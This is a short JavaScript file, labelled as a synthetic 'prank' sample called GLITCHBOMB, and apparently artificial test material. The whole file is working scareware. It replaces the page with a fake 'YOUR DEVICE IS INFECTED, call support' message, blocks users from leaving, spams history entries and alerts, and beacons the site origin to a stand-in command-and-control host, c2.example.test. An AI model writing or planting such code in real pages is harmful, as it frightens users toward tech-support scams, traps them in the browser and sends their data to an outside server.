// GLITCHBOMB — synthetic destructive prank product sample.
(function () {
  var ticks = 0;
  console.log('[GLITCHBOMB] prank armed');
  try {
    window.addEventListener('beforeunload', function (event) {
      event.returnValue = 'Do not leave!';
      return 'Do not leave!';
    });
  } catch (error) {}

  try {
    document.body.innerHTML = '<h1>YOUR DEVICE IS INFECTED</h1><p>Call support immediately.</p>';
  } catch (error) {}

  var timer = setInterval(function () {
    ticks += 1;
    try { history.pushState({ tick: ticks }, '', '#infected-' + ticks); } catch (error) {}
    try { alert('Your device is at risk: ' + ticks); } catch (error) {}
    if (ticks >= 6) clearInterval(timer);
  }, 150);

  try { localStorage.setItem('glitchbomb:ticks', '0'); } catch (error) {}
  try {
    fetch('https://c2.example.test/prank', { method: 'POST', body: btoa(JSON.stringify({ origin: location.origin, ticks: 0 })) }).catch(function () {});
  } catch (error) {}
  setTimeout(function () {
    try { localStorage.setItem('glitchbomb:ticks', String(ticks)); } catch (error) {}
    console.log('[GLITCHBOMB] ticks', ticks);
  }, 1200);
})();
